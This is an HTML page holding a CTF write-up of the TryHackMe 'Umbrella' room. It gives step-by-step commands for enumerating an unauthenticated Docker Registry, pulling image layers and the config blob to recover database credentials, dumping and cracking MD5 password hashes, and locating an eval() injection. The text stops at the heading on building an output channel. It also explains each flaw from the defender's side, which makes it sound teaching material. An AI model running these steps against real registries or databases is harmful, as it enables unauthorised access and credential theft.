@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Umbrella — TryHackMe Writeup — Maks Huseynli</title>
+  <meta name="description" content="Umbrella TryHackMe writeup — an anonymous Docker Registry hands over the application image, DB credentials leak from the image config's ENV block, an eval() sink gives root in the container, and CAP_MKNOD plus /proc/PID/root reads the host's disk straight through the container wall." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:         #0b0f14;
+      --bg-2:       #0f1419;
+      --bg-3:       #141b22;
+      --bg-code:    #0d1117;
+      --border:     #1e2730;
+      --border-2:   #253040;
+      --text:       #c8d0da;
+      --text-dim:   #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:     #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:      #34c759;
+      --yellow:     #ff9f0a;
+      --red:        #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; letter-spacing: 0.02em; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-h { background: rgba(255,69,58,0.08);  color: var(--red);    border: 1px solid rgba(255,69,58,0.2); }
+    .badge-e { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 640px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+    .info-value a { color: var(--accent); text-decoration: none; }
+    .info-value a:hover { text-decoration: underline; }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; letter-spacing: -0.01em; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+    .section code { font-family: var(--mono); font-size: 12px; color: #a8bccd; background: rgba(255,255,255,0.04); border: 1px solid var(--border); padding: 1px 5px; border-radius: 3px; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; white-space: pre; background: none; border: none; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+    .cy { color: var(--yellow); }
+    .cp { color: #c8a0e0; }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+    .callout code { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.06); padding: 1px 5px; border-radius: 3px; font-family: var(--mono); font-size: 11.5px; }
+
+    .ports { display: flex; gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .port { flex: 1; background: var(--bg-2); padding: 18px 14px; text-align: center; }
+    .port-num { font-family: var(--mono); font-size: 17px; color: var(--accent); font-weight: 500; }
+    .port-svc { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-top: 4px; }
+    .port-note { font-size: 10px; color: var(--text-faint); margin-top: 3px; }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+
+    .chain { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; padding: 24px 28px; margin: 18px 0; }
+    .chain-row { display: flex; align-items: flex-start; gap: 14px; margin-bottom: 10px; }
+    .chain-row:last-child { margin-bottom: 0; }
+    .chain-arrow { font-family: var(--mono); font-size: 11px; color: var(--text-faint); padding-top: 2px; flex-shrink: 0; }
+    .chain-bug { font-family: var(--mono); font-size: 12px; color: var(--accent); flex-shrink: 0; min-width: 220px; }
+    .chain-gives { font-size: 12px; color: var(--text-dim); }
+
+    .tbl { width: 100%; border-collapse: collapse; margin: 16px 0; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+    .tbl thead tr { background: var(--bg-2); }
+    .tbl th { font-family: var(--mono); font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-faint); text-align: left; padding: 10px 16px; font-weight: 400; border-bottom: 1px solid var(--border); }
+    .tbl td { padding: 10px 16px; font-family: var(--mono); font-size: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border); background: var(--bg); }
+    .tbl tbody tr:last-child td { border-bottom: none; }
+    .tbl td:first-child { color: var(--accent); }
+    .tbl td em { color: var(--text-faint); font-style: normal; font-family: var(--sans); font-size: 12px; }
+
+    .tbl-wrap { overflow-x: auto; }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .ports { flex-direction: column; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#case-studies" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Docker</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">Container Escape</span>
+    <span class="badge badge-d">Medium</span>
+  </div>
+  <h1><strong>Umbrella</strong></h1>
+  <p class="hero-desc">
+    A Docker Registry left open to the world hands over the application image, and the database password turns out not to be in the code at all — it's sitting in the image's <code>ENV</code> metadata, where nobody thinks to look. From there it's MD5 hashes, an <code>eval()</code> the app politely advertises in its own UI, and a container escape that reads the host's raw disk without ever mounting it. Naming the corporation "Umbrella" was, in hindsight, a warning.
+  </p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Medium</span></div>
+    <div class="info-item"><span class="info-label">Category</span><span class="info-value">Docker / Web / Escape</span></div>
+    <div class="info-item"><span class="info-label">Room</span><span class="info-value"><a href="https://tryhackme.com/room/umbrella" target="_blank" rel="noopener">tryhackme.com/room/umbrella</a></span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <!-- ── 01 RECON ── -->
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Reconnaissance</h2>
+    <p>Fast scan first — see who's talking before committing to the full 65535.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo nmap -sS -sV -sC 10.48.153.254 -F -T4</code></pre>
+    <div class="ports">
+      <div class="port"><div class="port-num">22</div><div class="port-svc">SSH</div><div class="port-note">OpenSSH 8.2p1 Ubuntu</div></div>
+      <div class="port"><div class="port-num">3306</div><div class="port-svc">MySQL</div><div class="port-note">5.7.40</div></div>
+      <div class="port"><div class="port-num">5000</div><div class="port-svc">Docker Registry</div><div class="port-note">HTTP API v2</div></div>
+      <div class="port"><div class="port-num">8080</div><div class="port-svc">Node.js / Express</div><div class="port-note">login page</div></div>
+    </div>
+    <p>Four ports, and three of them are already a story. <strong>MySQL listening on a public interface</strong> is a decision somebody made on purpose — the default in every sane deployment is <code>bind-address = 127.0.0.1</code>, so seeing 3306 answer from outside means it was deliberately opened. <strong>A Docker Registry on 5000</strong> is even louder: that's a private artifact store for container images, the kind of thing that belongs behind a VPN and an auth proxy, not on the open internet.</p>
+    <p>The web app on 8080 gets the first look anyway, because that's where a login form is, and login forms are where credentials eventually get used.</p>
+
+    <h3>Fuzzing 8080 — a dead end, quickly</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ffuf -u http://10.48.153.254:8080/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -e .php,.html,.txt</code></pre>
+    <p>Nothing. A login page and a whole lot of 404s. Which is fine — a Node/Express app isn't going to leak <code>.php</code> backups, and content discovery against a single-page login form is mostly a formality. Ten seconds of "well, it was worth checking."</p>
+
+    <h3>Fuzzing 5000 — considerably more productive</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+dirsearch -u http://10.48.153.254:5000
+
+<span class="cg">[200] /v2/</span>
+<span class="cg">[200] /v2/_catalog</span></code></pre>
+    <p><code>/v2/</code> returning <code>200</code> instead of <code>401</code> is the entire finding, right there. That endpoint is the Docker Registry API's version handshake, and it exists specifically so clients can probe whether authentication is required. A <code>401</code> with a <code>WWW-Authenticate</code> header means "log in first." A <code>200</code> means "help yourself."</p>
+    <div class="callout red"><strong>An anonymous Docker Registry is a source-code disclosure vulnerability wearing a DevOps hat.</strong> Container images are not opaque binaries — they're tar archives of a full filesystem, plus a JSON manifest describing how the image was built. Anyone who can reach the API can download the application's complete source, its dependencies, its build history, and every environment variable baked in at build time. No exploit required; it's the API working exactly as designed.</div>
+  </section>
+
+  <!-- ── 02 REGISTRY ── -->
+  <section class="section" id="registry">
+    <div class="s-num">02</div>
+    <h2>Docker Registry API v2 — Enumerating the Shelf</h2>
+    <p>The Registry API is small and completely predictable. Three requests take you from "there is a registry here" to "I have the image."</p>
+
+    <h3>What repositories exist</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl http://10.48.153.254:5000/v2/_catalog
+<span class="cg">{"repositories":["umbrella/timetracking"]}</span></code></pre>
+    <p>One repository: <code>umbrella/timetracking</code>. Given that port 8080 is serving a login page for what is presumably a time tracking app, we've just found its source code before we've found its password field.</p>
+
+    <h3>What versions of it</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl http://10.48.153.254:5000/v2/umbrella/timetracking/tags/list
+<span class="cg">{"name":"umbrella/timetracking","tags":["latest"]}</span></code></pre>
+
+    <h3>What it's made of</h3>
+    <p>The manifest is the image's table of contents: a list of layer digests plus a pointer to the config blob. Note the <code>Accept</code> header — ask for the v2 manifest schema explicitly, or the registry may hand back a legacy v1 format that's laid out differently.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -H <span class="cs">"Accept: application/vnd.docker.distribution.manifest.v2+json"</span> \
+  http://10.48.153.254:5000/v2/umbrella/timetracking/manifests/latest</code></pre>
+    <pre><code><div class="ph"><span class="pl">output — manifest (trimmed)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+{
+  <span class="cs">"schemaVersion"</span>: 2,
+  <span class="cs">"config"</span>: {
+    <span class="cs">"mediaType"</span>: <span class="cs">"application/vnd.docker.container.image.v1+json"</span>,
+    <span class="cs">"digest"</span>: <span class="cy">"sha256:7843f102a2fcb44f83d5..."</span>   <span class="ck"># ← remember this one</span>
+  },
+  <span class="cs">"layers"</span>: [
+    { <span class="cs">"digest"</span>: <span class="cs">"sha256:3f4ca61aafcd4fc07267..."</span> },
+    { <span class="cs">"digest"</span>: <span class="cs">"sha256:00fde01815c92cc90586..."</span> },
+    <span class="ck">... 11 layers total ...</span>
+  ]
+}</code></pre>
+    <div class="callout blue"><strong>Two kinds of blob live in that JSON, and they hold different secrets.</strong> The <code>layers</code> array is the filesystem — every <code>COPY</code>, <code>RUN</code> and <code>apt install</code> from the Dockerfile, one tarball each. The <code>config</code> object is the <em>metadata</em>: entrypoint, working directory, exposed ports, build history, and — the part that matters later — the full <code>ENV</code> block. Most people unpack the layers, grep them, find nothing, and stop. The config blob is a separate download and it is where this box hides the keys.</div>
+  </section>
+
+  <!-- ── 03 LAYERS ── -->
+  <section class="section" id="layers">
+    <div class="s-num">03</div>
+    <h2>Reassembling the Filesystem</h2>
+    <p>Eleven layers, each fetched from the <code>/blobs/</code> endpoint by digest. My shell is fish, so the loop syntax below is fish rather than bash — same idea, fewer semicolons.</p>
+    <pre><code><div class="ph"><span class="pl">fish — pull every layer</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+mkdir -p layers; cd layers
+
+<span class="ca">for</span> digest <span class="ca">in</span> \
+    3f4ca61aafcd4fc07267a105067db35c0f0ac630e1970f3cd0c7bf552780e985 \
+    00fde01815c92cc90586fcf531723ab210577a0f1cb1600f08d9f8e12c18f108 \
+    a3241ece5841b2e29213eb450a1b29385bf9e0063c37978253c98ff517e6e1b3 \
+    f897be510228b2f804fc2cb5d04cddae2e5689cbede553fb2d587c54be0ba762 \
+    23e2f216e8246d20ed3271ad109cec07f2a00b17bef8529708d8ae86100c7e03 \
+    15b79dac86ef36668f382565f91d1667f7a6fc876a3b58b508b6778d8ed71c0e \
+    7fbf137cf91ff826f2b2fddf3a30ea2e3d2e62d17525b708fd76db392e58df62 \
+    e5e56a29478cdf60132aa574648135a89299151414b465942a569f2109eefa65 \
+    82f3f98b46d4129f725cab6326d0521589d5b75ae0a480256495d216b2cd9216 \
+    62c454461c50ff8fb0d1c5d5ad8146203bb4505b30b9c27e6f05461b6d07edcb \
+    c9124d8ccff258cf42f1598eae732c3f530bf4cdfbd7c4cd7b235dfae2e0a549
+    curl -s <span class="cs">"http://10.48.153.254:5000/v2/umbrella/timetracking/blobs/sha256:$digest"</span> \
+         -o <span class="cs">"$digest.tar.gz"</span>
+<span class="ca">end</span></code></pre>
+
+    <p>Now flatten them. Layers are ordered and cumulative — each one is a diff against everything below it — so extracting them into a single directory <em>in manifest order</em> reproduces the container's root filesystem exactly as the app sees it.</p>
+    <pre><code><div class="ph"><span class="pl">fish — flatten into one rootfs</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+mkdir -p ../rootfs
+<span class="ca">for</span> f <span class="ca">in</span> *.tar.gz
+    tar -xzf <span class="cs">"$f"</span> -C ../rootfs 2&gt;/dev/null
+<span class="ca">end</span>
+cd ../rootfs</code></pre>
+    <p>The <code>2&gt;/dev/null</code> is not laziness — it's suppressing the whiteout-file warnings tar throws when a later layer deletes something an earlier one created. Harmless noise for our purposes.</p>
+
+    <h3>Grepping for the obvious</h3>
+    <pre><code><div class="ph"><span class="pl">fish — hunt for secrets</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+grep -rEn <span class="cs">"password|passwd|DB_|mysql|secret|api_key|token"</span> \
+    --include=<span class="cs">"*.js"</span> --include=<span class="cs">"*.env"</span> --include=<span class="cs">"*.json"</span> \
+    --include=<span class="cs">"*.yml"</span> --include=<span class="cs">"*.yaml"</span> . 2&gt;/dev/null
+
+find . -iname <span class="cs">"*.env*"</span> -o -iname <span class="cs">"config*.js"</span> -o -iname <span class="cs">"docker-compose*"</span></code></pre>
+    <p>This turns up the application source at <code>usr/src/app/app.js</code> — the whole Express app, routes and all — but no password. The DB connection reads from <code>process.env.DB_PASS</code>, which is exactly what a competent developer is supposed to do. Credentials don't belong in source control.</p>
+    <div class="callout yellow"><strong>And here's the trap.</strong> "Not in the code" gets read as "not in the image," and those are very different statements. The developer moved the secret out of <code>app.js</code> and into an environment variable — then set that environment variable with an <code>ENV</code> instruction in the Dockerfile. Which bakes it permanently into the image metadata, published to a registry with no authentication. The secret didn't get protected; it got relocated somewhere less obvious.</div>
+  </section>
+
+  <!-- ── 04 CONFIG BLOB ── -->
+  <section class="section" id="config">
+    <div class="s-num">04</div>
+    <h2>The Config Blob — Where the Password Actually Lives</h2>
+    <p>Back to the manifest, and that <code>config.digest</code> we set aside. It's fetched from the same <code>/blobs/</code> endpoint as the layers, but it isn't a tarball — it's a plain JSON document describing the image's runtime configuration.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s http://10.48.153.254:5000/v2/umbrella/timetracking/blobs/sha256:7843f102a2fcb44f83d52a49afaff3af44e2b59793fbd06c21d235395588a286 \
+  | python3 -m json.tool | grep -A 30 <span class="cs">'"Env"'</span></code></pre>
+    <pre><code><div class="ph"><span class="pl">output — image config, Env block</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cs">"Env"</span>: [
+    <span class="cs">"PATH=/usr/local/sbin:/usr/local/bin:..."</span>,
+    <span class="cs">"NODE_VERSION=18.12.1"</span>,
+    <span class="cs">"DB_HOST=db"</span>,
+    <span class="cg">"DB_USER=root"</span>,
+    <span class="cr">"DB_PASS=[redacted]"</span>,          <span class="ck"># ← there it is</span>
+    <span class="cs">"DB_DATABASE=timetracking"</span>,
+    <span class="cs">"LOG_FILE=/logs/tt.log"</span>
+]</code></pre>
+    <p>Root credentials to the database, published anonymously over HTTP, retrievable with a single <code>curl</code>. The password itself is a piece of chess notation — a real opening line, move by move — which is a genuinely nice touch from the room author and also completely irrelevant to how fast it fell over. Cleverness in a password only helps if the password is somewhere secret.</p>
+    <div class="callout red"><strong><code>ENV</code> in a Dockerfile is not a secret store — it's the opposite.</strong> Anything set with <code>ENV</code> is written into the image config, survives forever in the build history, is visible to <code>docker inspect</code>, to <code>docker history</code>, to every developer who pulls the image, and to any stranger who can reach the registry. Even <code>ARG</code> passed at build time leaks into history. Real secrets go in at <em>runtime</em> — orchestrator secrets, a mounted vault, <code>--env-file</code> outside the image — never at build time.</div>
+    <div class="callout blue"><strong>Also worth reading in that same blob:</strong> the <code>history</code> array. It contains every Dockerfile instruction as a literal command string. Even when <code>Env</code> is clean, build history routinely leaks internal hostnames, private package registry URLs, <code>curl</code> commands with tokens in them, and the odd <code>RUN echo $PASSWORD &gt; /tmp/x</code>. It's free reconnaissance and almost nobody sanitises it.</div>
+  </section>
+
+  <!-- ── 05 MYSQL ── -->
+  <section class="section" id="mysql">
+    <div class="s-num">05</div>
+    <h2>MySQL — Root, From the Internet</h2>
+    <p>The <code>DB_HOST=db</code> value is a Docker Compose service name, meaningless from outside the container network. But nmap already told us 3306 answers on the host itself, so the database is reachable directly — the credentials just need pointing at the public IP instead.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+mysql -h 10.48.153.254 -u root -p<span class="cs">'[redacted]'</span> timetracking</code></pre>
+    <pre><code><div class="ph"><span class="pl">sql</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ca">SHOW</span> DATABASES;
+<span class="ca">USE</span> timetracking;
+<span class="ca">SHOW</span> TABLES;
+<span class="ca">SELECT</span> * <span class="ca">FROM</span> users;</code></pre>
+    <div class="tbl-wrap">
+    <table class="tbl">
+      <thead><tr><th>User</th><th>Password hash</th><th></th></tr></thead>
+      <tbody>
+        <tr><td>claire-r</td><td>2ac9cb7dc02b3c0083eb70898e549b63</td><td><em>32 hex chars — unsalted MD5</em></td></tr>
+        <tr><td>chris-r</td><td>0d107d09f5bbe40cade3de5c71e9e9b7</td><td><em>same</em></td></tr>
+        <tr><td>jill-v</td><td>d5c0607301ad5d5c1528962a83992ac8</td><td><em>same</em></td></tr>
+        <tr><td>barry-b</td><td>4a04890400b5d7bac101baace5d7e994</td><td><em>same</em></td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p>Resident Evil's entire surviving cast, stored as bare MD5. We don't even have to guess the algorithm — the source code we pulled out of the registry in section 03 spells it out:</p>
+    <pre><code><div class="ph"><span class="pl">javascript — usr/src/app/app.js</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ca">const</span> hash = crypto.<span class="cp">createHash</span>(<span class="cs">'md5'</span>).<span class="cp">update</span>(password).<span class="cp">digest</span>(<span class="cs">'hex'</span>);</code></pre>
+    <div class="callout yellow"><strong>MD5 with no salt, in 2026.</strong> No salt means identical passwords produce identical hashes — so duplicates across accounts are visible at a glance — and MD5 itself is fast enough that a consumer GPU chews through billions of candidates per second. This is not "weak hashing," it's "storing the passwords with extra steps." Password storage is a solved problem with exactly three acceptable answers: bcrypt, scrypt, or Argon2.</div>
+  </section>
+
+  <!-- ── 06 CRACK ── -->
+  <section class="section" id="crack">
+    <div class="s-num">06</div>
+    <h2>Cracking, and Walking Through the Front Door</h2>
+    <p>Four hashes, one wordlist, no strategy required.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+john --format=Raw-MD5 --wordlist=~/Downloads/rockyou.txt hash.txt
+john --format=Raw-MD5 --show hash.txt
+
+<span class="cg">claire-r:Password1</span>
+<span class="ck">1 password hash cracked, 3 left</span></code></pre>
+    <p>Instant. Not "a few minutes" — instant, because <code>Password1</code> sits near the top of rockyou and satisfies most corporate complexity policies at the same time: uppercase, lowercase, a digit, eight characters. It is the canonical example of a policy that measures the wrong thing. The other three held out, and one cracked account is one more than we need.</p>
+
+    <h3>Logging into the app</h3>
+    <p>Straight to <code>http://10.48.153.254:8080</code> with <code>claire-r:Password1</code>. The credentials came out of the app's own users table, so of course they work — this is the intended login, just with someone else's password.</p>
+
+    <div class="shot">
+      <div class="sh"><span class="sl">timetracking — authenticated dashboard</span><span class="ss">200 OK</span></div>
+      <img src="umbrellalogged.png" alt="Umbrella time tracking dashboard after login: an Increase time spent form with a Pro Tip saying mathematical expressions like 5+4 are accepted, next to a Time Tracking Statistics table listing claire-r, chris-r, jill-v and barry-b" loading="lazy" />
+      <div class="sc">Left: the "Increase time spent" form. Right: the stats table — barry-b has logged 798 hours, which is either dedication or a very stuck timer.</div>
+    </div>
+
+    <p>And there, in a friendly blue banner, the application volunteers the vulnerability:</p>
+    <div class="callout blue"><strong>"Pro Tip: You can also use mathematical expressions, e.g. <code>5+4</code>"</strong></div>
+    <p>A web form that evaluates arithmetic is a web form that is running <em>something</em> as code. There are safe ways to parse <code>5+4</code> and there are lazy ways, and a hint box bragging about the feature is a strong signal about which one got shipped. We already have the source code, so no guessing is necessary — just open <code>app.js</code> and look at the route.</p>
+  </section>
+
+  <!-- ── 07 RCE ── -->
+  <section class="section" id="rce">
+    <div class="s-num">07</div>
+    <h2>eval() — Remote Code Execution as Advertised</h2>
+    <pre><code><div class="ph"><span class="pl">javascript — app.js, POST /time</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+app.<span class="cp">post</span>(<span class="cs">'/time'</span>, (request, response) =&gt; {
+    <span class="ck">// ...</span>
+    <span class="ca">let</span> timeCalc = <span class="cp">parseInt</span>(<span class="cr">eval</span>(request.body.time));   <span class="ck">// ← user input, straight into eval()</span>
+    <span class="ck">// ...</span>
+});</code></pre>
+    <p>User-controlled input passed directly to <code>eval()</code>. That's Server-Side Code Injection — the whole vulnerability in one line. <code>parseInt()</code> wrapped around it does absolutely nothing defensive: <code>eval()</code> runs first, executes whatever it's given, and only then does <code>parseInt()</code> attempt to make a number out of the leftovers. By the time <code>parseInt</code> has an opinion, our code has already run.</p>
+    <p>Crucially, this is <strong>blind</strong>. The route stores a number and redirects; it never reflects the result back. So the first job isn't a shell, it's an output channel.</p>
+
+    <h3>Building an output channel</h3>
